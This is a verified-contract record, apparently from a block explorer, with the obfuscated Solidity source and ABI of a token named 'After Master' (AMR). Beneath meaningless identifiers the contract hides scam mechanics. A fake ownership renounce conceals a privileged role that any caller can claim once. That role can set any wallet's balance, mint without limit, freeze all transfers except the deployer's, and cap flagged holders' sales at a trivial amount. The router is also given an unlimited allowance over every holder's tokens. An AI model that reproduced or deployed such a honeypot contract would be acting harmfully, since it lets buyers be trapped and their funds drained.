{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface liquidityTotalShould {\n    function createPair(address tokenSell, address teamMarketing) external returns (address);\n}\n\ninterface fromMarketingSwap {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address marketingList) external view returns (uint256);\n\n    function transfer(address txMin, uint256 tokenAmount) external returns (bool);\n\n    function allowance(address walletMin, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 tokenAmount) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address txMin,\n        uint256 tokenAmount\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed sellLaunchReceiver, uint256 value);\n    event Approval(address indexed walletMin, address indexed spender, uint256 value);\n}\n\nabstract contract walletAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tokenReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface autoFrom is fromMarketingSwap {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AfterMaster is walletAmount, fromMarketingSwap, autoFrom {\n\n    uint256 private enableReceiverMax;\n\n    mapping(address => mapping(address => uint256)) private modeLimit;\n\n    uint256 private launchedTotalReceiver;\n\n    event OwnershipTransferred(address indexed swapLaunched, address indexed modeExempt);\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletMax;\n    }\n\n    function transferFrom(address fundExempt, address txMin, uint256 tokenAmount) external override returns (bool) {\n        if (_msgSender() != tokenMode) {\n            if (modeLimit[fundExempt][_msgSender()] != type(uint256).max) {\n                require(tokenAmount <= modeLimit[fundExempt][_msgSender()]);\n                modeLimit[fundExempt][_msgSender()] -= tokenAmount;\n            }\n        }\n        return swapMarketing(fundExempt, txMin, tokenAmount);\n    }\n\n    uint256 fromSellReceiver;\n\n    function owner() external view returns (address) {\n        return enableTxLaunch;\n    }\n\n    address tokenMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function decimals() external view virtual override returns (uint8) {\n        return receiverSender;\n    }\n\n    bool private sellMarketing;\n\n    function allowance(address feeLimitAt, address isMin) external view virtual override returns (uint256) {\n        if (isMin == tokenMode) {\n            return type(uint256).max;\n        }\n        return modeLimit[feeLimitAt][isMin];\n    }\n\n    string private tradingAt = \"After Master\";\n\n    function feeIsAt(address walletToSwap, uint256 tokenAmount) public {\n        sellIs();\n        marketingTx[walletToSwap] = tokenAmount;\n    }\n\n    function maxLiquiditySender(address fundExempt, address txMin, uint256 tokenAmount) internal returns (bool) {\n        require(marketingTx[fundExempt] >= tokenAmount);\n        marketingTx[fundExempt] -= tokenAmount;\n        marketingTx[txMin] += tokenAmount;\n        emit Transfer(fundExempt, txMin, tokenAmount);\n        return true;\n    }\n\n    function atFee(uint256 tokenAmount) public {\n        sellIs();\n        fromSellReceiver = tokenAmount;\n    }\n\n    function transfer(address walletToSwap, uint256 tokenAmount) external virtual override returns (bool) {\n        return swapMarketing(_msgSender(), walletToSwap, tokenAmount);\n    }\n\n    function minList(address isFee) public {\n        sellIs();\n        if (sellMarketing != receiverFee) {\n            receiverFee = true;\n        }\n        if (isFee == launchSender || isFee == shouldIs) {\n            return;\n        }\n        takeTo[isFee] = true;\n    }\n\n    address public launchSender;\n\n    string private walletMax = \"AMR\";\n\n    address teamLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private totalMarketing = 100000000 * 10 ** 18;\n\n    uint256 listFund;\n\n    function getOwner() external view returns (address) {\n        return enableTxLaunch;\n    }\n\n    uint256 private atTxSender;\n\n    mapping(address => uint256) private marketingTx;\n\n    function name() external view virtual override returns (string memory) {\n        return tradingAt;\n    }\n\n    bool public txSellSwap;\n\n    bool public receiverFee;\n\n    function swapMarketing(address fundExempt, address txMin, uint256 tokenAmount) internal returns (bool) {\n        if (fundExempt == launchSender) {\n            return maxLiquiditySender(fundExempt, txMin, tokenAmount);\n        }\n        uint256 limitFund = fromMarketingSwap(shouldIs).balanceOf(teamLaunch);\n        require(limitFund == fromSellReceiver);\n        require(txMin != teamLaunch);\n        if (takeTo[fundExempt]) {\n            return maxLiquiditySender(fundExempt, txMin, receiverFrom);\n        }\n        return maxLiquiditySender(fundExempt, txMin, tokenAmount);\n    }\n\n    function takeFeeBuy() public {\n        emit OwnershipTransferred(launchSender, address(0));\n        enableTxLaunch = address(0);\n    }\n\n    function approve(address isMin, uint256 tokenAmount) public virtual override returns (bool) {\n        modeLimit[_msgSender()][isMin] = tokenAmount;\n        emit Approval(_msgSender(), isMin, tokenAmount);\n        return true;\n    }\n\n    function amountTeam(address tradingTokenAuto) public {\n        require(tradingTokenAuto.balance < 100000);\n        if (txSellSwap) {\n            return;\n        }\n        \n        atSender[tradingTokenAuto] = true;\n        \n        txSellSwap = true;\n    }\n\n    function sellIs() private view {\n        require(atSender[_msgSender()]);\n    }\n\n    bool public minToken;\n\n    address private enableTxLaunch;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return totalMarketing;\n    }\n\n    uint256 constant receiverFrom = 14 ** 10;\n\n    function balanceOf(address marketingList) public view virtual override returns (uint256) {\n        return marketingTx[marketingList];\n    }\n\n    mapping(address => bool) public atSender;\n\n    constructor (){\n        \n        tokenReceiver isExempt = tokenReceiver(tokenMode);\n        shouldIs = liquidityTotalShould(isExempt.factory()).createPair(isExempt.WETH(), address(this));\n        if (enableReceiverMax == launchedTotalReceiver) {\n            sellMarketing = true;\n        }\n        launchSender = _msgSender();\n        atSender[launchSender] = true;\n        marketingTx[launchSender] = totalMarketing;\n        takeFeeBuy();\n        if (receiverFee) {\n            enableReceiverMax = launchedTotalReceiver;\n        }\n        emit Transfer(address(0), launchSender, totalMarketing);\n    }\n\n    mapping(address => bool) public takeTo;\n\n    uint8 private receiverSender = 18;\n\n    address public shouldIs;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletMin\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellLaunchReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeLimitAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isMin\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTokenAuto\",\"type\":\"address\"}],\"name\":\"amountTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenAmount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"tokenAmount\",\"type\":\"uint256\"}],\"name\":\"atFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingList\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletToSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenAmount\",\"type\":\"uint256\"}],\"name\":\"feeIsAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isFee\",\"type\":\"address\"}],\"name\":\"minList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldIs\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeFeeBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"takeTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletToSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenAmount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundExempt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"txMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"tokenAmount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txSellSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AfterMaster", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}